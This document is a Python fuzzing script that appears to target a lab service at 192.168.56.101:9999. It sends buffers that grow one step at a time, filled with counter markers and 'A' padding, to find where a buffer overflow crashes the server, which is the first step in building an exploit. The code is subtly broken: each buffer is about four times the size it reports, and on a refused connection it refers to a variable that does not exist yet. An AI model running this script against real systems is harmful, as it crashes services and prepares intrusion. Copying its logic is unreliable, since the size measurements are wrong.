import socket
import time

def test_precise_buffer(start_size, step):
    try:
        target_ip = "192.168.56.101"
        target_port = 9999
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        # Receive banner
        s.recv(1024)
        
        # Create buffer with position markers
        buffer = ""
        counter = 0
        for i in range(0, start_size, step):
            # Add a counting pattern to help identify position
            buffer += str(counter).zfill(4)
            buffer += "A" * (step - 4)
            counter += 1
            
        payload = buffer + "\n"
        print(f"Sending {len(buffer)} bytes...")
        s.send(payload.encode())
        
        time.sleep(1)
        response = s.recv(1024)
        s.close()
        
    except ConnectionRefusedError:
        print(f"Crash occurred at size: {len(buffer)}")
        return True
    except Exception as e:
        print(f"Error occurred: {e}")
    
    return False

# Test with more precise sizes around 1000
start_size = 510  # Start a bit before crash
step = 1         # Test in smaller increments

while start_size <= 1100:  # Go a bit beyond crash
    print(f"\nTesting size: {start_size}")
    crashed = test_precise_buffer(start_size, step)
    if crashed:
        break
    time.sleep(3)  # Wait between tests
    start_size += 1 
